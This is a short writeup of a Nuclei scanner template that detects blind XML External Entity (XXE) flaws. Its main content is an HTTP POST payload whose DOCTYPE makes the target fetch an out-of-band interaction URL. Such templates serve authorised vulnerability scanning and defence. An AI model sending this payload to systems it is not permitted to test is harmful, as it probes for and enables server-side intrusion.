# Nuclei Template: Generic Blind XXE
**Template ID:** generic-blind-xxe
**Vulnerability Class:** XML External Entities (XXE)
**Severity:** High
**CWE:** CWE-611
**Source:** Nuclei Template (`generic-blind-xxe.yaml`)

## Vulnerability Information & PoC

## Description
This template detects Generic Blind XXE.

## Steps to reproduce / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: {{BaseURL}}

<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://{{interactsh-url}}">
<foo>&e1;</foo>
```

